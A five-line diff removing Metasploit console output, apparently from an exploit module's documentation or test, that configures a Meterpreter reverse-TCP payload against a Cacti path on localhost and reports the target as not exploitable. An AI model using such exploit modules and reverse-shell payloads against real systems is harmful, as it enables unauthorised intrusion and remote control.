@@ -1,5 +1,0 @@
-[*] Using configured payload linux/x86/meterpreter/reverse_tcp
-RHOSTS => 127.0.0.1
-RPORT => 8080
-TARGETURI => /cacti
-[*] 127.0.0.1:8080 - The target is not exploitable. Target is not a Cacti application.
